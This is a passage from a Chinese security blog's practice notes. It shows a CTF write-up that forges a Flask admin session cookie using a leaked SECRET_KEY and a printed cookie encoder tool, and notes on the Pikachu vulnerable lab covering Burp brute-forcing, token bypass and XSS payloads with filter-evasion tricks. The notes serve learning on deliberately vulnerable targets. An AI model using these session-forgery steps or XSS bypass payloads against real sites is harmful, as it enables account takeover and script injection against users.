                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105194339154-1342806614.png"
                      alt="img"
                ></p>
<p>通过以下代码进行解码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(decryption(<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;输入需要解码的Session:&quot;</span>)).encode() ))</span><br></pre></td></tr></table></figure>

<p>解码情况如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105195822437-1005309453.png"
                      alt="img"
                ></p>
<p>解码完成之后就是伪造session</p>
<p>伪造session需要SECRET_KEY</p>
<p>在项目文件中可以找到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>SECRET_KEY为”<code>ckj123&quot;</code></p>
<p>“name”由”beacon”修改为”admin”</p>
<p>进行session加密</p>
<p>加密代码如下（<a class="link"   href="https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py" >取自GitHub<i class="fas fa-external-link-alt"></i></a>）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, secret_key</span>):</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span>(<span class="params">metaclass=ABCMeta</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span>(<span class="params">ABC</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,</span><br><span class="line">                epilog=<span class="string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&#x27;sub-command help&#x27;</span>, dest=<span class="string">&#x27;subcommand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">&#x27;encode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;encode&#x27;</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie structure&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">&#x27;decode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie value&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">&#x27;encode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">&#x27;decode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python .\flask_session_cookie_manager.py encode -s <span class="string">&quot;ckj123&quot;</span> -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;3fbbbd4cf0447592eac22fe47104c884df13b3eb75f93a47a15ca80c53c2de846e6606703cb8d1e9bd9ec0f9f124d9edcfc909583cfc8c42fe7eaeca159441ab&#x27;, &#x27;csrf_token&#x27;: b&#x27;ade7afede008694bd78e9ab33291242fb3d9d3d4&#x27;, &#x27;image&#x27;: b&#x27;6xVv&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>将原session修改成伪造后的session值即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105202358312-2022507867.png"
                      alt="img"
                ></p>
<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p>网上一题三解：<a class="link"   href="https://www.anquanke.com/post/id/164086" >三种本题解法<i class="fas fa-external-link-alt"></i></a></p>
<p>Unicode查询：<a class="link"   href="https://unicode-table.com/en/search/?q=small+capital" >Unicode character table<i class="fas fa-external-link-alt"></i></a></p>
<p>Session相关：<a class="link"   href="https://www.leavesongs.com/PENETRATION/client-session-security.html" >session<i class="fas fa-external-link-alt"></i></a></p>
<p>Session加密：<a class="link"   href="https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py" >Session加密<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>CTF-WEB</category>
      </categories>
      <tags>
        <tag>练习记录</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu漏洞库练习记录</title>
    <url>/2021/pikachu%E6%BC%8F%E6%B4%9E%E5%BA%93%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
<p>Burte Force（暴力破解）概述</p>
<p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
<p>1.是否要求用户设置复杂的密码；</p>
<p>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；</p>
<p>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；</p>
<p>4.是否采用了双因素认证；</p>
<p>…等等。</p>
</blockquote>
<h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>使用 BURPSUITE 进行暴力破解</p>
<p>爆破时，选择 Cluster bumb 模式对 Username 与 Password 进行爆破</p>
<p> Cluster bumb 模式将对爆破目标做笛卡尔积</p>
<p>此处有三个用户，分别为：</p>
<p>admin/123456</p>
<p>pikachu/000000</p>
<p>test/abc123</p>
<h2 id="验证码绕过（on-server-与-on-client）"><a href="#验证码绕过（on-server-与-on-client）" class="headerlink" title="验证码绕过（on server 与 on client）"></a>验证码绕过（on server 与 on client）</h2><p>on server</p>
<p>验证码在后台不会过期，每一次爆破皆可使用</p>
<p>爆破时在抓取的数据包中填入正确的验证码即可在每一次爆破中使用验证码</p>
<p>on client</p>
<p>验证码在前端生成并检查，可被绕过</p>
<h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><blockquote>
<p>1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p>
<p>2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
<p>3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p>
</blockquote>
<p>后端会生成一个token值返回给客户端，当客户端进行请求时，同时携带该token</p>
<p>与服务端token比对，相同则接受</p>
<p>本题使用pitchfork进行爆破，不足是爆破点只能选择密码与token值</p>
<p>在第二个爆破点，即token值进行如下设置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210219155221491-1293409603.png"
                      alt="img"
                ></p>
<p>然后在options中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210219155350029-1244433763.png"
                      alt="img"
                ></p>
<p>选择原token值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210219155005753-928757328.png"
                      alt="img"
                ></p>
<p>开始爆破前，需将线程数设置为1</p>
<p>由于第二个爆破选取递归爆破的方式，故线程数只能为1</p>
<p>爆破后得admin账户密码为123456</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210219155756570-535661287.png"
                      alt="img"
                ></p>
<p>该方式一极大弊端为不能连用户名一起进行爆破</p>
<p>而若连用户名一起进行爆破选择笛卡尔积模式的话</p>
<p>笔者还没能处理好token值与用户名及密码的关系</p>
<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>模块详解：Intruder模块<a class="link"   href="https://blog.csdn.net/u011781521/article/details/54772795" >模块详解<i class="fas fa-external-link-alt"></i></a></p>
<p>四种爆破模式：<a class="link"   href="https://blog.csdn.net/liweibin812/article/details/107428616" >爆破模式<i class="fas fa-external-link-alt"></i></a></p>
<p>token：<a class="link"   href="https://www.jianshu.com/p/24825a2683e6" >什么是token<i class="fas fa-external-link-alt"></i></a></p>
<p>四种爆破模式大致如下：</p>
<p>1.sniper　对单点进行爆破，若设置多个爆破点，则使用同一字典对其分别爆破</p>
<p>2.battering ram　对多个点使用同一字典进行同时爆破</p>
<p>3.pitch-fork　对不同点使用不同字典分别爆破</p>
<p>4.cluster bomb　对不同点使用不同字典进行笛卡尔积爆破</p>
<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><blockquote>
<p>XSS（跨站脚本）概述</p>
<p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p>
<p>1.反射性XSS;<br>2.存储型XSS;<br>3.DOM型XSS;</p>
<p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</p>
<p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p>
<p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
<p>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p>
</blockquote>
<h2 id="反射型xss（get）"><a href="#反射型xss（get）" class="headerlink" title="反射型xss（get）"></a>反射型xss（get）</h2><p>写入 ‘“&lt;&gt;bea123 测试写入的特殊字符会不会被过滤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210221150308336-1042428670.png"
                      alt="img"
                ></p>
<p>发现没有过滤字符</p>
<p>写入xss代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;BEACON&quot;)&lt;&#x2F;script&gt; </span><br></pre></td></tr></table></figure>

<p>代码长度受限，通过代码审计修改长度即可</p>
<h2 id="反射型xss（post）"><a href="#反射型xss（post）" class="headerlink" title="反射型xss（post）"></a>反射型xss（post）</h2><p>登录后执行相同操作</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><blockquote>
<p>漏洞描述：xss代码被注入到后台并存储起来，构成持久性危害</p>
</blockquote>
<p>同样判断有无过滤字符</p>
<p>执行同样操作</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><blockquote>
<p>漏洞描述：前端数据被DOM获取，并通过DOM又输出到前端(危害低，不会经过后端)</p>
</blockquote>
<p>网页源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210221173637274-1162009598.png"
                      alt="img"
                ></p>
<p>我们先通过 ‘&gt; 闭合了herf标签，然后再插入相应的payload</p>
<p>根据提示构造payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>网页源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210221174421289-1365465828.png"
                      alt="img"
                ></p>
<p>与前面不同的是，前面通过 getElementById 获取到了标签 Id 为 text的内容赋值给str</p>
<p>然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 Id 为 dom的 div 标签中</p>
<p>这里则是定义了一个domxss函数</p>
<p>利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str</p>
<p>然后经过URL解码和字符串分隔，取出URL中的参数内容</p>
<p>再把 “+” 替换为 “ ”（空格），赋值给 xss</p>
<p>最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中</p>
<p>跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的</p>
<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p>所谓盲打即所插入的内容不会在前端显示，故不能在前端得到相应的反馈</p>
<p>插入的内容在后端，若插入的xss没有被过滤，则可在后台执行</p>
<h2 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2><p>对于xss的过滤，主要运用两种思路进行绕过</p>
<p>首先是转换，将xss命令转换为其他形式，其次则是使用编码的手段</p>
<h3 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h3><p>1.抓包重新插入，或修改前端HTML代码</p>
<p>2.修改大小写，若正则匹配只匹配小写，则可绕过</p>
<p>3.双写（拼凑），例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;&#x2F;scri&lt;&#x2F;script&gt;pt&gt;</span><br></pre></td></tr></table></figure>

<p>后台即使过滤script，也有只过滤一次的可能</p>
<p>4.注释干扰，例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;&#x2F;sc&lt;!--test--&gt;ript&gt;</span><br></pre></td></tr></table></figure>

<p>加上注释后，有绕过后台过滤机制的可能</p>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><blockquote>
<p>核心思路：</p>
<p>后台过滤了特殊字符，比如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>标签，但该标签可以被各种编码，后台不一定过滤</p>
<p>当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223152003462-824413854.png"
                      alt="img"
                ></p>
<h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223172253554-104013079.png"
                      alt="img"
                ></p>
<p> 测试输入 “‘&lt;&gt;?#’666 </p>
<p>得到反馈</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223172520672-2025406854.png"
                      alt="img"
                ></p>
<p>发现该函数在我这里好像没有任何反应</p>
<p>而其他环境下反应应是如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223181123424-1839070548.png"
                      alt="img"
                ></p>
<p>需要在payload前后加上单引号’用于闭合herf中的单引号</p>
<p>构造如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(11111) &#39; </span><br></pre></td></tr></table></figure>

<p>而其中只能输入数字</p>
<p>两个单引号与正文需有一个空格相隔</p>
<p>后端单引号可去掉，但空格仍需要存在</p>
<h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>此处需了解到javascript伪协议<a class="link"   href="https://www.cnblogs.com/forforever/p/12711197.html" >文章地址<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，</p>
<p>而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:</p>
<p>我们可以在浏览地址栏里输入”javascript:alert(‘JS!’);”，点转到后会发现，实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p>
